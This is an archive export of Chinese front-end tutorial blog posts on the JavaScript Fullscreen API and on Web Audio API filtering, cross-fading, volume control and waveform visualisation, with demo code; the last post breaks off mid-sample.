    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. @update 文章下方有更新，提到了更多全屏的知识以及错误的矫正。页面全屏是一个体验非常棒的功能，他可以让你的视觉焦点聚集在你想关注的元素块上。很多浏览器都支持全屏，按下 F11，哦了！ 页面全屏了~&nbsp;但是本文要说的并不是这种全屏。当页面中有个小 DEMO 或者小游戏要展示的时候，用户期望，这个 DEMO 或者游戏可以在全屏下展示，本文就教你如何来展示。如果你是非 IE 浏览器进入的该页面，你可能已经看到了页面上发生了一点小变化，多个东西：没错，多了个\进入全屏”的按钮，这就是本文要介绍的内容！本文地址：http://www.cnblogs.com/hustskyking/p/javascript-fullscreen.html，转载请注明源地址。一、全屏策略1. 原理一些浏览器提供了元素全屏的接口，这些接口的调用特别简单： 1234// 进入全屏element.requestFullScreen();// 退出全屏document.exitFullscreen(); 这是 w3c 规范统一的接口，但是浏览器总是那么调皮，内部实现的时候会加上自己厂商的前缀，如： 1234// 小狐element.mozRequestFullScreen();// Chromedocument.webkitCancelFullScreen(); 这里有两点需要引起注意，W3C 中的退出全屏是 exitFullscreen，而小狐跟 Chrome 使用的是 cancelFullScreen，这里在作判断的时候不要弄错了；再一点就是当我们退出全屏的时候，并不是使用 element 作为退出的对象了，而是使用 document。2. 兼容处理原理是很简单，但是针对浏览器的兼容性写起来还是挺麻烦的，幸好 Chrome 换用 blink内核 之后没有继续加上一个 -blink-，否则开发者心里会有无数个草泥马奔腾的！对于进入全屏： 1234567891011function launchFullScreen(element) &#123; if (element.requestFullscreen) &#123; element.requestFullscreen(); &#125; else if (element.msRequestFullscreen) &#123; element.msRequestFullscreen(); &#125; else if (element.mozRequestFullScreen) &#123; element.mozRequestFullScreen(); &#125; else if (element.webkitRequestFullscreen) &#123; element.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT); &#125;&#125; 对于退出全屏： 1234567891011function cancelFullScreen() &#123; if (document.exitFullscreen) &#123; document.exitFullscreen(); &#125; else if (document.msExitFullscreen) &#123; document.msExitFullscreen(); &#125; else if (document.mozCancelFullScreen) &#123; document.mozCancelFullScreen(); &#125; else if (document.webkitExitFullscreen) &#123; document.webkitExitFullscreen(); &#125;&#125; 3. 浏览器兼容性 IE 用户就甭看了，刚测试，IE11 不兼容（需要加前缀 ms）。对于浏览器的兼容情况，请戳这里。目前 Firefox 兼容，不过有点离谱。他会弹出一个让你全屏的提示，此时确实是全屏的，但当你点击提示中的\允许”时，屏幕又退出了全屏，真是让人匪夷所思。我测试的版本（27.0.1）有这个问题，当然，这是浏览器本身的问题，不用纠结。Chrome 对于新特性的支持永远是站在前排，不得不佩服 google 开发工程师的牛掰！二、3 个 bug1. window 失去焦点当全屏一个元素块的时候，原始状态该元素块可能没有 padding 或者 margin 值，为了让他显示的稍微养眼一些，我们可能会给他主动加上 padding 值，然后在退出全屏的时候在拿到设置的值。但此时，一个 bug 出现鸟，当我们点击全屏页面中的 a 标签，或者触发了某个 window.open 之后，浏览器会失去焦点，跳到新开的页面中，而全屏的页面会退出全屏，搞笑的是我们开始设置的 padding 值他不给我们去掉，这个是令人十分神伤的，不过没关系，有 bug 咱们就打补丁！ 1234window.onblur = function()&#123; cancelFullsreen(); changeThePadding();&#125;; 有人会想到，我们在点击 a 链接的时候先 changeThePadding()，再让 a 标签跳走，这种方式是不合理的，因为除了 a 链接会让页面失去焦点之外还有其他的可能（如 window.open）。@update 因为 bug 3 的存在，这里不能这样改，需要利用浏览器的全屏探测： 1234567$(document).on(&apos;webkitfullscreenchange mozfullscreenchange msfullscreenchange fullscreenchange&apos;, function()&#123; if (!document.fullscreenElement &amp;&amp; // alternative standard method !document.mozFullScreenElement &amp;&amp; !document.webkitFullscreenElement &amp;&amp; !document.msFullscreenElement ) &#123; // 在这里处理 bug changeThePadding();&#125; &#125;); 2. 一个貌似可以重现的 bug 所谓的可以重现就是，把代码逻辑抽离出来，写个 demo 还能看到 bug。反正我试过好几次，这个 bug 都出现了，懒得写一个 DEMO 重现他。他出现的位置是：我的滚动条是自己设置的样式，当全屏之后，滚动条本应该在页面的最右侧，但是我测试的时候他偶尔会离最右侧有十几个像素，我也不知道为什么。但是当我打开 DevTools 的时候，这十几个像素又奇妙的被缝合了~后来一想，管你呢，这肯定是 google 的工程师没有留意到的位置！既然开打 DevTools 可以修复，那就说明触发 window.resize 也能解决这个问题，好吧，那就这样试试吧： 1234newCancelFullscreen = function()&#123; cancelFullscreen(); window.onresize();&#125;; 果然有效，bug 搞定！3. 全屏之后，部分浏览器会在该页面失去焦点这就相当于，全屏之后，触发了 window.blur();三、小结除了上面提到的两个 bug，还有一个值得注意的是，如果你全屏的那个元素块很高但却没有设置 1element &#123; overflow:auto; &#125; 之类的东西，你会发现滚烂你的鼠标也滚不出那块区域。本文介绍了如何使用 javascript 将页面中的某个元素调至全屏，并指出了再使用过程中的两个 bug，希望引起注意！四、参考资料http://baidufe.com/ Alien的笔记@update 2014/03/01 12:001. Trident 内核的 IE 浏览器是支持的，可以用&nbsp;element.msRequestFullscreen()，退出用&nbsp;msExitFullscreen()2. 对于全屏的元素可以使用伪元素给他加样式： 1234:-webkit-full-screen #myvideo &#123; width: 100%; height: 100%;&#125; 3. 浏览器提供的两个方便开发的东西：fullscreenElement：如果这个属性为空，则浏览器处于非全屏状态，否则就是处于全屏。fullscreenEnabled：这个属性告诉你浏览器 document 是否可以全屏。4. 也可以使用 keydown 来控制全屏，如： 12345document.addEventListener(&quot;keydown&quot;, function(e) &#123; if (e.keyCode == 13) &#123; toggleFullScreen(); &#125;&#125;, false); 对于 toggleFullScreen 函数： 123456789101112131415161718192021222324252627function toggleFullScreen() &#123; if (!document.fullscreenElement &amp;&amp; // alternative standard method !document.mozFullScreenElement &amp;&amp; !document.webkitFullscreenElement &amp;&amp; !document.msFullscreenElement ) &#123; // current working methods if (document.documentElement.requestFullscreen) &#123; document.documentElement.requestFullscreen(); &#125; else if (document.documentElement.msRequestFullscreen) &#123; document.documentElement.msRequestFullscreen(); &#125; else if (document.documentElement.mozRequestFullScreen) &#123; document.documentElement.mozRequestFullScreen(); &#125; else if (document.documentElement.webkitRequestFullscreen) &#123; document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT); &#125; &#125; else &#123; if (document.exitFullscreen) &#123; document.exitFullscreen(); &#125; else if (document.msExitFullscreen) &#123; document.msExitFullscreen(); &#125; else if (document.mozCancelFullScreen) &#123; document.mozCancelFullScreen(); &#125; else if (document.webkitExitFullscreen) &#123; document.webkitExitFullscreen(); &#125; &#125;&#125;Toggle FullScreen 5. 全屏事件看到这句代码你可能就懂了： 1$(document).on(&apos;webkitfullscreenchange mozfullscreenchange fullscreenchange&apos;,fn); 当全屏状态改变时会触发上面的 fullscreenchange 事件，所以 #15 p2227 给我提出的问题就可以得到解决了。 文章可能还存在错误的地方，还请多多斧正！]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[声音的滤波]]></title>
    <url>%2Fblog%2F2014%2F02%2F28%2F2014-02-28-cb-webAudio-filter%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 本系列文章主要是介绍 Web Audio API 的相关知识，以及 web语音通信 中会遇到的一些问题，阐述可能存在错误，还请多多斧正！通过设备获取音频流会不可避免的渗入一些杂音，这些杂音可能来自你周边的环境，也有可能来自录音设备本身，一些低频的声音还好，人耳难以分辨出来，但是那些高频的白噪声对音质的影响是特别大的，如我们听收音机没有调到正确的频率上，会听到吱吱兹兹的刺耳的杂音。这些杂音不仅增大了音频流信号本身的体积，而且我们的耳朵也不喜欢，所以在传输之前必须对音频做相应的滤波处理。本文地址：http://www.cnblogs.com/hustskyking/p/webAudio-filter.html，转载请注明源地址。P.S：请在较新版的 chrome 火狐 Firefox 中测试。一、滤波节点1. 接口介绍频率，是单位时间内完成振动的次数，是描述振动物体往复运动频繁程度的量。一段音频流中包含了各种频率，温和的音乐频率在一个范围之内，超过这个范围的声音一般就是噪声，人和人之间的语音交流，声音也是在一定的频段之中。在 AudioContext 中用于滤波的节点叫做 BiquadFilterNode，Biquad 是双二阶的意思，这里涉及到了很多通信中专业词汇，我们暂时可以不用在意。BiquadFilterType 包含了各种滤波类型： 12345678910enum BiquadFilterType &#123; &quot;lowpass&quot;, &quot;highpass&quot;, &quot;bandpass&quot;, &quot;lowshelf&quot;, &quot;highshelf&quot;, &quot;peaking&quot;, &quot;notch&quot;, &quot;allpass&quot;&#125;; 用的比较多的就是 lowpass（低通滤波），highpass（高通滤波），bandpass（带通滤波）。低通滤波就是过滤某个临界点的高频信号，只让低频信号通过，高通滤波反之。带通滤波就是允许某个频段的信号通过。这个节点的参数比较多： 1234567891011attribute BiquadFilterType type;readonly attribute AudioParam frequency; // in Hertzreadonly attribute AudioParam detune; // in Centsreadonly attribute AudioParam Q; // Quality factorreadonly attribute AudioParam gain; // in Decibelsvoid getFrequencyResponse(Float32Array frequencyHz, Float32Array magResponse, Float32Array phaseResponse);&#125;; 其中几个参数的取值范围是：Q 默认是 1, 取值从 0.0001 到 1000.gain 默认是 0, 取值从 -40 到 40.2. 初始化接口我们可以在初始化的时候将 BiquadFilterType 送进去： 12// 初始化为低通滤波var filter = context.createBiquadFilter(&quot;lowpass&quot;); 当然，我们也可以通过设置他的 AudioParam 来控制参数： 12345var filter = context.createBiquadFilter();// 设置为低通滤波filter.type = filter.LOWPASS;// 只允许频率小于 800Hz 的音频信号通过filter.frequency.value = 800; 两只方式都是一样的，都好控制。3. DEMO 测试简单点的话，中间只用一个 filter 节点就可以了，使用低通滤波，将频率设置为 800Hz，可以听到声音很闷，声音不是变小了，而是变闷了~节点之间的连接方式是：Source -&gt; Filter -&gt; Destination代码： 123456789101112var AudioContext = AudioContext || webkitAudioContext;var context = new AudioContext;//创建节点var audio = new Audio(&quot;http://qianduannotes.duapp.com/file/SuperMario.mp3&quot;);audio.loop = true;var media = context.createMediaElementSource(audio);var filter = context.createBiquadFilter();filter.type=filter.LOWPASS;filter.frequency.value=800;//连接：media → filter → destinationmedia.connect(filter);filter.connect(context.destination);audio.play(); 为了方面查看改变频率之后波形的变化，我做了一些处理：Source -&gt; Filter -&gt; Analyser -&gt; Destination&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; +—–&gt; 波形绘制到 Canvas1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;canvas id=&quot;canvas&quot; width=&quot;400&quot; height=&quot;300&quot;&gt;&lt;/canvas&gt;&lt;br&gt;&lt;input type=&quot;range&quot; min=&quot;0&quot; max=&quot;100&quot; id=&quot;volume&quot;&gt;&lt;input type=&quot;button&quot; onclick=&quot;audio.play()&quot; value=&quot;播放&quot;&gt;&lt;input type=&quot;button&quot; onclick=&quot;audio.pause()&quot; value=&quot;暂停&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt;var AudioContext=AudioContext||webkitAudioContext;var context=new AudioContext;//创建节点var audio = new Audio(&quot;http://qianduannotes.duapp.com/file/SuperMario.mp3&quot;);audio.loop = true;var media=context.createMediaElementSource(audio);var filter=context.createBiquadFilter();var analyser=context.createAnalyser();//只允许小于800的频率通过filter.type=filter.LOWPASS;filter.frequency.value=800;//Canvas初始化var width=canvas.width,height=canvas.height;var g=canvas.getContext(&quot;2d&quot;);g.translate(0.5,height/2+0.5);//连接：media → filter → analyser → destinationmedia.connect(filter);filter.connect(analyser);analyser.connect(context.destination);//以fftSize为长度创建一个字节数组作为数据缓冲区var output=new Uint8Array(analyser.fftSize);//播放帧(function callee(e)&#123; analyser.getByteTimeDomainData(output); //将缓冲区的数据绘制到Canvas上 g.clearRect(-0.5,-height/2-0.5,width,height); g.beginPath(); for(var i=0;i&lt;width;i++) g.lineTo(i,height*(output[output.length*i/width|0]/256-0.5)); g.stroke(); //请求下一帧 requestAnimationFrame(callee);&#125;)();//播放audio.play();load = volume.onchange = function()&#123; filter.frequency.value = volume.value * volume.value;&#125;&lt;/script&gt;DEMO Code这里频率的变化是： 1filter.frequency.value = volume.value * volume.value; 线性变化可能不太明显，所以改成了平方变化。 二、小结 滤波在通信中一个重要的意义是减少数据传输量，节约频带，提高传送效率，在硬件设备还未跟上语音通信的 web环境中，这个操作是十分有意义的！ 本节重点是介绍 BiquadFilterNode 在 AudioContext 环境中的使用，比较简单。 三、参考资料 http://www.w3.org/TR/webaudio/ W3C Grouphttp://www.web-tinker.com/ 次碳酸钴]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>webaudio</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[声道的转换]]></title>
    <url>%2Fblog%2F2014%2F02%2F27%2F2014-02-27-cb-webAudio-cross-fading%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 本系列文章主要是介绍 Web Audio API 的相关知识，以及 web语音通信 中会遇到的一些问题，阐述可能存在错误，还请多多斧正！很多粤语剧都提供了两个声道，一个左声道为粤语，一个右声道有国语。观看者可以自由切换声道，那么切换声道的原理是什么呢？在播放器中，只需要把不同的声道切换到声轨就行了，因为有左右两个声道，所以播放器至少是包含两个声轨的。如果我们想听粤语，只需要将右声道声轨的声音设置为 0，或者临时删掉右声道声轨。本文主要是利用 GainNode 节点控制音量的属性实现两个音轨之间的相互切换，Cross-fading 的意思可以在后面的 DEMO 中用耳朵体会出来~本文地址：http://www.cnblogs.com/hustskyking/p/webAudio-cross-fading.html，转载请注明源地址。P.S：请在较新版的 chrome 火狐 Firefox 中测试。一、两个声音之间的声轨切换1. 原理介绍在一个 AudioContext 中可以输入多个音频流，而这些音频流在 AudioContext 这个环境中辗转反侧，最后的出路也就是 DestinationNode：source 1 —+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |—-&gt; Destinationsource 2 —+而要实现上面两个声轨的切换，实则是它容易了，我们可以在他们到达 Destination 之前，加一个 GainNode，上文 已经对 GainNode 做了详细的说明，本文就不继续赘述了。2. DEMO 演示首先要创建两个音频，平时我们都是使用 audio 节点带上 src 属性，插入到 DOM 中让其自动播放音频，本文将使用其他的方式拿到音频流： 1var tank = new Audio(&quot;http://qianduannotes.duapp.com/file/tankWar.mp3&quot;); 我准备了两个音频，一个是 tankWar.mp3 ，经典的坦克大战开场音乐，另一个是 SuperMario.mp3，超级玛丽的背景音乐，前者稍微短一些，所以在播放的时候将其设定为循环播放： 1tank.loop = true; 然后利用 createMediaElementSource 这个函数从 Media 中获取到音频流： 1var source1 = context.createMediaElementSource(tank); 过程十分简单，整个 AudioContext 的连接模型为：source 1 –&gt; GainNode 1 -+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|—-&gt; Destinationsource 2 –&gt; GainNode 2 -+然后用同一个控制棒来控制 GainNode 1 和 2。 1234567891011121314151617181920212223242526272829303132&lt;input type=&quot;range&quot; min=&quot;0&quot; max=&quot;100&quot; id=&quot;volume&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt; var tank = new Audio(&quot;http://qianduannotes.duapp.com/file/tankWar.mp3&quot;); tank.loop = true; var mario = new Audio(&quot;http://qianduannotes.duapp.com/file/SuperMario.mp3&quot;); mario.loop = true; var AudioContext = AudioContext || webkitAudioContext; var context = new AudioContext(); var source1 = context.createMediaElementSource(tank); var source2 = context.createMediaElementSource(mario); var gain1 = context.createGain(); var gain2 = context.createGain(); //连接：source → gain → destination source1.connect(gain1); source2.connect(gain2); gain1.connect(context.destination); gain2.connect(context.destination); //音量控制 var value; onload = volume.onchange = function()&#123; gain1.gain.value = volume.value / 100; gain2.gain.value = 1 - volume.value / 100; &#125;; tank.onload = mario.onlond = function()&#123; console.log(&quot;var1, var2&quot;); &#125; tank.play(); mario.play();&lt;/script&gt; 代码没有封装，写的稍微有些乱，不过看了之前的说明，应该可以理解这段代码~3. 效果增强上面的音量控制，我使用的是线性控制： 12gain1.gain.value = volume.value / 100;gain2.gain.value = 1 - volume.value / 100; 效果并不是特别好，他对音量的控制如下图：稍微修改下控制函数： 123var vol = volume.value / 100;gain1.gain.value = Math.cos(vol * 0.5 * Math.PI);gain2.gain.value = Math.cos((1.0 - vol) * 0.5 * Math.PI); 可以感受到音量的变化是这样的： 详情可以戳这个demo：http://qianduannotes.duapp.com/demo/audio/ 二、小结 本文的目的是介绍 Web Audio API 的 GainNode 节点的使用，并将此应用到声道的切换之中，上面的例子不能算是严格的声道切换，但如果我们只给 volume 参数设定 0 ,50, 100 这三个值，那效果跟声道的切换就差不多了~ 由于这几篇文章都是关于 Node 之间的相互连接，技术含量并不多，主要是读懂 API 以及相关使用方法。行文仓促，如有错误地方，还请斧正！ 三、参考资料 http://www.w3.org/TR/webaudio/ W3C Grouphttp://www.web-tinker.com/ 次碳酸钴]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>webaudio</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[音量的控制]]></title>
    <url>%2Fblog%2F2014%2F02%2F26%2F2014-02-26-cb-webAudio-volume%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 改变音频的音量是音频处理中最基础的部分，我们可以利用 GainNode 来构建 Mixers 的结构块。GainNode 的接口是很简单的： 123interface GainNode : AudioNode &#123; readonly attribute AudioParam gain;&#125;; 通过调节 GainNode.gain.value 就可以实现音频大小的调控了。下文会先介绍使用 Processor 来处理，这是一个最通用的节点，可以处理很多东西。在上文看得到的音频流中我们也使用了该节点。本文地址：http://www.cnblogs.com/hustskyking/p/webAudio-volume.html，转载请注明源地址。P.S：请在较新版的 chrome 火狐 Firefox 中测试。一、音频流音量大小的控制1. 使用 Processor 处理这个过程比较简单：source Node -&gt; Processor Node -&gt; Destination Node数据送入到 Processor 后，由于输入 channel 和输出的 channel 之间的对应关系需要我们自己去处理，这些对应关系可以在 onaudioprocess 事件中处理，只要上面的连接导通，那这个事件就一直会处于触发状态，无论是否有数据流送入（其实没有数据流送入也就是数据流 bufferArray 为 0 嘛）。可以看下面这个 DEMO： 1234567891011121314151617181920212223242526&lt;audio src=&quot;http://qianduannotes.duapp.com/file/tankWar.mp3&quot; id=&quot;audio&quot; autoplay&gt;&lt;/audio&gt;&lt;input type=&quot;range&quot; min=&quot;0&quot; max=&quot;100&quot; id=&quot;volume&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt; var AudioContext = AudioContext || webkitAudioContext; var context = new AudioContext(); var source = context.createMediaElementSource(audio); // 低通滤波节点（高频信号被过滤，听到的声音会很沉闷） var processor = context.createScriptProcessor(1024, 1, 1); // sourceNode - &gt; processor -&gt; destinationNode source.connect(processor); processor.connect(context.destination); //处理过程 processor.onaudioprocess = function(e)&#123; //获取输入和输出的数据缓冲区 var input = e.inputBuffer.getChannelData(0); var output = e.outputBuffer.getChannelData(0); //将输入数缓冲复制到输出缓冲上，并调整音量 for(var i =0; i &lt; input.length; i++) output[i] = input[i] * value; &#125;; //音量控制 var value; onload = volume.onchange = function()&#123; value = volume.value / 200; &#125;;&lt;/script&gt; 2. 使用 GainNode 控制 上面这种方式，我们可以在 onaudioprocess 事件中拿到几乎我们想要的所有数据，并且可以进行各种处理，可以说 processor 这个节点十分通用，但他的性能并不是高，你应该也看到了上面的代码中有： 123//将输入数缓冲复制到输出缓冲上，并调整音量 for(var i =0; i &lt; input.length; i++) output[i] = input[i] * value; 需要将数据一一复制到输出节点，上面 demo 中我们设定的 bufferSize 是 1024 ，如果再大一些，或者文中需要处理的节点数太多，那页面将会很卡。Web Audio API 中提供了提供音量的节点，GainNode，既然提供了，毫无疑问，就用它呗~节点连接方式也是十分的方便：source → gain → destination然后通过一个 range 控件来调节 Gain 的 gain 参数。DEMO如下： 12345678910111213141516&lt;audio src=&quot;http://qianduannotes.duapp.com/file/tankWar.mp3&quot; id=&quot;audio&quot; autoplay&gt;&lt;/audio&gt;&lt;input type=&quot;range&quot; min=&quot;0&quot; max=&quot;100&quot; id=&quot;volume&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt; var AudioContext = AudioContext || webkitAudioContext; var context = new AudioContext(); var source = context.createMediaElementSource(audio); var Gain = context.createGain(); //连接：source → Gain → destination source.connect(Gain); Gain.connect(context.destination); //音量控制 var value; onload = volume.onchange = function()&#123; gain.gain.value = volume.value / 200; &#125;;&lt;/script&gt; 十分轻松简洁的处理一个音量控制。 二、小结 本文主要是介绍 Web Audio API 中的 GainNode 节点，以及相关的应用。文中的两个 DEMO ，前者利用 processor 节点来处理，关于这个几点的说明，可以参考上两篇文章的接受；后者是使用 GainNode ，通过控制 Gain.gain.value 的值来调节音量的大小，过程十分简单，所以本文的思路也是比较的清晰。 如果本文中有叙述不正确的地方，还请斧正！ 三、参考资料 http://www.w3.org/TR/webaudio/ W3C Grouphttp://www.web-tinker.com/ 次碳酸钴]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>webaudio</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[看得到的音频流]]></title>
    <url>%2Fblog%2F2014%2F02%2F22%2F2014-02-22-cb-webAudio-show-audio%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 上文介绍了 Web Audio API 的相关知识，以及如何在你的 web 程序中引入 音频流，内容都是介绍性的，所以没有写太多 DEMO。本文重点讲解如何利用 Web Audio API 中的中间节点拿到音频信号的信息，并将信息转化成信号图绘制到 canvas 中。从上文中我们了解到，AudioContext 是音频播放和处理的一个环境，大概的流程是这个样子： 12345678910111213141516 +---------------+------------------------------------+ | AudioContext | | +---------------+ | | +-------+ +-------+ +-------+ | | | | | | | | |==========&gt;| Source|===&gt;|Lots of|===&gt;| Dest | Output |Multi Input| | | | | |===========&gt;==========&gt;| Node |===&gt;| Nodes |===&gt;| Node | | | | | | | | | | | +-------+ +-------+ +-------+ | | | | | | Created By Barret Lee | +-------------------------|--------------------------+ | +-------------+ +========&gt;| Other Tools | signal +-------------+ 在 AudioContext 中，通过一个结点（AudioNode）来接受输入源，中间的一些结点可以过滤、放大、去杂等处理 Source Node 的信号，处理之后可以送到 AudioContext 的输出结点，然后启用 source.start() 播放音频信息；也可以将处理的信息送到外部交给其他对象来处理，比如本文要谈到的，将信号交给 Canvas 来处理，这样就能看到音频信号的波形图了。本文地址：http://www.cnblogs.com/hustskyking/p/webAudio-show-audio.html，转载请注明源地址。注：较新版 Google Chrome 和 Firefox 才能运行本文中的 DEMO。一、节点的连接先说一说，各个节点在 AudioContext 中的连接是如何用代码实现的: 12345678910111213// 创建一个 AudioContext 环境var context = new AudioContext();function playSound() &#123; // 创建一个 Source 节点 var source = context.createBufferSource(); // 拿到输入源（狗吠） source.buffer = dogBarkingBuffer; // 将 source 节点链接到 destination 节点（输出节点） source.connect(context.destination); // currentTime 设定为 0，开始播放 source.start(0);&#125; 上面的连接十分简单，直接将 source 节点连接到 destination 节点，相当于没有经过人任何处理，直接输出了，而下面的方式是创建一个中间节点，对信号做一些处理，不过在拿到 Source 的方式上跟上面有些不一样： 123456789var audio = document.getElementsByTagName(&quot;audio&quot;)[0];// context 为一个 AudioContext 环境// 从 audio 元素中拿到输入源，也就是上图所看到的 Mutil Inputvar source = context.createMediaElementSource(audio);// 建立一个处理延时节点var delayNode = context.createDelay();// sourceNode -&gt; delayNode -&gt; destinationNodesource.connect(delayNode);delayNode.connect(context.destination); 这里需要注意的是，destination 是 AudioContext 实例的固有属性，他就是信号的最终汇聚的位置，也是信号的输出位置。下面是一个简单的 DEMO 代码： 12345678910111213141516&lt;audio src=&quot;http://qianduannotes.duapp.com/file/tankWar.mp3&quot; id=&quot;origin&quot;&gt;&lt;/audio&gt;&lt;audio src=&quot;http://qianduannotes.duapp.com/file/tankWar.mp3&quot; id=&quot;audio&quot;&gt;&lt;/audio&gt;&lt;input type=&quot;button&quot; onclick=&quot;origin.play()&quot; value=&quot;原始音质 播放&quot;&gt;&lt;input type=&quot;button&quot; onclick=&quot;origin.pause()&quot; value=&quot;原始音源 暂停&quot;&gt;&lt;br&gt;&lt;input type=&quot;button&quot; onclick=&quot;audio.play()&quot; value=&quot;滤波音质 播放&quot;&gt;&lt;input type=&quot;button&quot; onclick=&quot;audio.pause()&quot; value=&quot;滤波音源 暂停&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt; var AudioContext = AudioContext || webkitAudioContext; var context = new AudioContext(); var source = context.createMediaElementSource(audio); // 低通滤波节点（高频信号被过滤，听到的声音会很沉闷） var FilterNode = context.createBiquadFilter(&quot;lowpass&quot;); // sourceNode -&gt; FilterNode -&gt; destinationNode source.connect(FilterNode); FilterNode.connect(context.destination);&lt;/script&gt; 上面的代码，AudioContext 获取 audio 源的原理是这样的：audio有一个内置的输出通道AudioContext 通过 createMediaElementSource 将 audio 的输出直接拉去到新的环境中，之前 audio 环境被破坏拉去的 source 没有 start 函数，他会一直监听 audio 的操控，当 play 函数被触发的时候，开始播放音频。也可以认为，play 函数触发了 start （老版浏览器中是 noteOn）下面是一个演示图： 1234567891011121314151617+----------+------------------------------+| audio | |+----------+ || +--------+ // +-------------+ || | Source |=====//==&gt;| Destination | || +--------+ | // +-------------+ || | |+-----------------|-----------------------+ | Created By Barret Lee +--------|-----+--------------------------+ | ↓ | | +--------+ +-------+ +------+ | | | Source |===&gt;| Nodes |===&gt;| Dest | | | +--------+ +-------+ +------+ | | +--------------+ | | AudioContext | +--------------------------+--------------+ 二、两个中间节点的介绍 1. ScriptProcessorNode 我们可以直接使用 JavaScript 操控这个节点，他的作用是产生、传递、分析一段音频。他有一个 bufferSize 属性和一个 onaudioprocess 事件。初始化一个 ScriptProcessorNode： 1var processor=context.createScriptProcessor(4096, 1, 1); 他接收三个参数，第一个是 bufferSize 的大小，取值范围是 Math.pow(2, N) ( 8&le;N&le;14 )，第二个参数是送入的 channel 数，第三个参数是输出的 channel 数。信息不会自动通过这个节点需要我们自己将输入的信号复制到输出位置去： 12345678910processor.onaudioprocess = function(e)&#123; //获取输入和输出的数据缓冲区 var input = e.inputBuffer.getChannelData(0); var output = e.outputBuffer.getChannelData(0); //将输入数缓冲复制到输出缓冲上 for(var i = 0, len = input.length; i &lt; len; i++)&#123; output[i] = input[i]; &#125;&#125; 这样处理的原因是因为多个输入要对应对个输出，也有可能是多对一或者一对多，所以这些信息的设定必须要人为去控制。关于 ScriptProcessorNode 的介绍，具体请移步http://www.w3.org/TR/webaudio/#ScriptProcessorNode-section2. AnalyserNode通过这个节点我们可以对信号进行频域和时域上的分析，学过 通信原理 的同学对这些属于应该是十分熟悉的。 123456789101112131415161718interface AnalyserNode : AudioNode &#123; // Real-time frequency-domain data void getFloatFrequencyData(Float32Array array); void getByteFrequencyData(Uint8Array array); // Real-time waveform data void getByteTimeDomainData(Uint8Array array); attribute unsigned long fftSize; readonly attribute unsigned long frequencyBinCount; attribute double minDecibels; attribute double maxDecibels; attribute double smoothingTimeConstant;&#125;; 上面是这个节点的接口信息，不要感到奇怪，对接口的描述，都是使用这种方式，从上面我们可以看到，他有三个方法，四个属性。fftSize 是指频率分析下的快速傅里叶变换大小，他的值被限定在 32-2048 的 2 的整数次方。关于 AnalyserNode 的介绍，具体请移步http://www.w3.org/TR/webaudio/#AnalyserNode-section三、音频信息的提取利用上面介绍的两个节点可以十分轻松的提取到音频信息，如使用 ScriptProcessorNode，在他的 onaudioprocess 触发的时候，可以拿到 input 信息，此时也就是音频信息流。 123456processor.onaudioprocess = function(e)&#123; //获取输入和输出的数据缓冲区 var input = e.inputBuffer.getChannelData(0); doSomething(input);&#125;; 上面这种方式拿到数据的效率是比较低的，一般可以直接使用 AnalyserNode 节点。这个节点中一个获取缓冲数据区的方法叫做 getByteTimeDomainData，这个方法的设计是十分偏底层的，或者对 JSer 来说，这个借口的设计并不合理，可以看看： 1234//以fftSize为长度创建一个字节数组作为数据缓冲区var output = new Uint8Array(analyser.fftSize);// 将获取得到的数据赋值给 outputanalyser.getByteTimeDomainData(output); 这里是把 output 作为引用传进 getByteTimeDomainData 函数中，相信大家应该没有在 JS 中遇到过这样的写法吧~ （我觉得在该 web 标准定稿的时候，这里一定会做修改！）四、信号图的绘制上面我们已经拿到了信号数据了，绘制工作其实就是 canvas 的事情啦~ 123456var width = canvas.width, height = canvas.height, g = canvas.getContext(&quot;2d&quot;);// 将坐标原点移动到(0.5, height / 2 + 0.5)的位置g.translate(0.5, height / 2 + 0.5); 然后绘制图形： 123456789processor.onaudioprocess=function(e)&#123; //获取输入和输出的数据缓冲区 var input = e.inputBuffer.getChannelData(0); var output = e.outputBuffer.getChannelData(0); 